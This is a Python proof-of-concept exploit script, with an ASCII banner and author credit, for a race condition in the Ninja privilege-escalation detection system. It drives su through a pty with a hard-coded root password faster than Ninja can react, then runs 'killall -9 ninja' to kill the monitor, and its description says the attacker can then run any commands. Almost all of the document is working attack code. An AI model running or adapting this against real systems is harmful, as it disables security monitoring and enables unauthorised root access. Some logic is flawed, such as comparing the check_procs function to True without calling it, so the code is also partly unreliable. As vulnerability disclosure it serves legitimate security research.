import pty, os, sys, subprocess
pid, fd = pty.fork()

#begin config
user = "root"
password  = "password"
command = "killall -9 ninja"
#end config


def usage():
	print """
@@@  @@@  @@@   @@@@@@@@  @@@  @@@       @@@   @@@@@@    @@@@@@@  @@@  @@@  
@@@  @@@  @@@  @@@@@@@@@  @@@  @@@       @@@  @@@@@@@@  @@@@@@@@  @@@  @@@  
@@!  @@@  @@!  !@@        @@!  @@@       @@!  @@!  @@@  !@@       @@!  !@@  
!@!  @!@  !@!  !@!        !@!  @!@       !@!  !@!  @!@  !@!       !@!  @!!  
@!@!@!@!  !!@  !@! @!@!@  @!@!@!@!       !!@  @!@!@!@!  !@!       @!@@!@!   
!!!@!!!!  !!!  !!! !!@!!  !!!@!!!!       !!!  !!!@!!!!  !!!       !!@!!!    
!!:  !!!  !!:  :!!   !!:  !!:  !!!       !!:  !!:  !!!  :!!       !!: :!!   
:!:  !:!  :!:  :!:   !::  :!:  !:!  !!:  :!:  :!:  !:!  :!:       :!:  !:!  
::   :::   ::   ::: ::::  ::   :::  ::: : ::  ::   :::   ::: :::   ::  :::  
 :   : :  :     :: :: :    :   : :   : :::     :   : :   :: :: :   :   ::: 
 
[Title] Ninja privilege escalation detection and prevention system race condition
[Author] Ben 'highjack' Sheppard
[URL] http://highjack.github.io/
 
[Description] There is a small delay between the time of execution of a command and the time privelege escalation is detected.
It is therefore possible to use a pty to run a command such as su and provide the password faster than it can be detected.
The following PoC becomes root using su and issues killall -9 ninja. The attacker can then run any commands that they wish.
 """
 

executions = 0
def check_procs():
	p1 = subprocess.Popen(["ps", "aux"], stdout=subprocess.PIPE)
	p2 = subprocess.Popen(["grep", "root"],  stdin=p1.stdout,  stdout=subprocess.PIPE)
	p3 = subprocess.Popen(["grep", "/sbin/ninja"], stdin=p2.stdout, stdout=subprocess.PIPE)
	output = p3.communicate()[0]
	if output != "":
		if executions != 0:
			sys.exit(0)
		return True
	else:
		return False

def kill_ninja():
	if pid == 0:
		os.execvp("su", ["su", user, "-c", command])
	elif pid > 0:
		try:
			os.read(fd, 1024)
			os.write(fd, password + "\n")
			os.read(fd,1024)
			os.wait()
			os.close(fd)
		except:
			usage()
			print "[+] Ninja is terminated"
			sys.exit(0)
			

while True:
	kill_ninja()
	if (check_procs == True):
		executions = executions + 1
		kill_ninja()

